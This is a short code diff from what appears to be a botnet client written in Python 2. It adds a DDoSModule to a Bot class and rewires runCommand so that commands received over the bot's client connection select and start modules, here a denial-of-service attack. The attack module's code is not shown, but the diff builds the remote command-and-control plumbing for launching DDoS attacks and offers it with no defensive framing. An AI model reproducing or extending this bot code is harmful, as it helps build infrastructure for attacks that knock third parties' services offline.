@@ -5,6 +5,7 @@ Created on Dec 20, 2013
 '''
 
 from CommandParser import CommandParser
+from modules.DDoSModule import DDoSModule
 
 class Bot(object):
     '''
@@ -19,10 +20,10 @@ class Bot(object):
         Constructor
         '''
         self.__client = client
-        self.__modules = []
+        self.__modules = {1:DDoSModule()}
         
     def runCommand(self, cmd):
-        print cmd
+        self.__modules[int(cmd[0])].start(cmd[1:])
     
     def activate(self):
         self.__client.connect()
